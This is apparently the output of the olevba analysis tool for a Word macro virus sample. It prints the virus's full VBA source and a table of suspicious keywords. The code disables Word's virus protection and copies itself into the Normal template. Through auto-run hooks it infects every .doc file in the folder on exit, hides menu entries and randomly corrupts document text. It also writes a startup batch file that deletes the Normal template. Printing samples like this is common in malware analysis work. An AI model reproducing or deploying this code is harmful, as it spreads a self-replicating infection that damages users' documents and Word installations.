olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-0caaafa867fbf551bcf69e7eae05974536144fe1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-0caaafa867fbf551bcf69e7eae05974536144fe1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO u1gqRbCsL.bas 
in file: Virus.MSWord.VMPC-based-0caaafa867fbf551bcf69e7eae05974536144fe1 - OLE stream: 'Macros/VBA/u1gqRbCsL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub u1gqRbCsL()
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("u1gqRbCsL").Export "c:\y4sl4xP.sys"
ActiveDocument.ReadOnlyRecommended = False
x4prsx = Int(Rnd * 1000)
If x4prsx = 22 Then Call YrNxMsoT
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox Chr(82) + Chr(85) + Chr(66) + Chr(66) + Chr(73) + Chr(83) + Chr(72) + vbCritical
 OrxWspTR$ = "c:\windows\startm~1\programs\startup\msfile.bat"
HrTxB78X = GetAttr(NormalTemplate.FullName)
If HrTxB78X = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call Xu1gqRbCsL(OrxWspTR$)
If HrTxB78X = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call Xu1gqRbCsL(OrxWspTR$)
If HrTxB78X = vbReadOnly Then GoTo du1gqRbCsL
If HrTxB78X = vbReadOnly + vbArchive Then GoTo du1gqRbCsL
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "u1gqRbCsL" Then r7CXyqSpzRU = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "u1gqRbCsL" Then xlt3sBR7Yw3 = True
Next I
If r7CXyqSpzRU = True And xlt3sBR7Yw3 = False Then Set Yr6SWxoPr = NormalTemplate.VBProject.VBComponents
If r7CXyqSpzRU = False And xlt3sBR7Yw3 = True Then Set Yr6SWxoPr = ActiveDocument.VBProject.VBComponents
Yr6SWxoPr.import "c:\y4sl4xP.sys"
If r7CXyqSpzRU = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If xlt3sBR7Yw3 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f12939 = m12129 & c5225 & Int(Rnd * 7393)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
du1gqRbCsL:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox Chr(73) + Chr(78) + Chr(70) + Chr(69) + Chr(67) + Chr(84) + Chr(69) + Chr(68) + Chr(32) + Chr(49) + Chr(57) + Chr(57) + Chr(56) + Chr(32) + Chr(45) + Chr(32) + Chr(50) + Chr(48) + Chr(48) + Chr(49), vbInformation
    MsgBox Chr(66) + Chr(89) + Chr(32) + Chr(86) + Chr(73) + Chr(82) + Chr(85) + Chr(83), vbCritical
End Sub
Sub FileNew()
    On Error Resume Next
    Call u1gqRbCsL
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call u1gqRbCsL
End Sub
Sub FileSave()
    On Error Resume Next
    Call u1gqRbCsL
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call u1gqRbCsL
End Sub
Sub FileExit()
    On Error Resume Next
    Call u1gqRbCsL
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call u1gqRbCsL
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call u1gqRbCsL
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call u1gqRbCsL
End Sub
Sub AutoExit()
    On Error Resume Next
    Call u1gqRbCsL
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call u1gqRbCsL
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call u1gqRbCsL
End If
Loop
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
Sub YrNxMsoT()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "the"
            .Replacement.Text = "fhtcJuAmQJp4x+5cIUWqSB+3"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
        CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
        CommandBars("edit").Controls("Repeat Replace...").Delete
        CommandBars("edit").Controls("Replace...").Delete
        CommandBars("edit").Controls("Find...").Delete
        CommandBars("tools").Controls("Spelling and Grammar...").Delete
        If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
    
Sub Xu1gqRbCsL(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

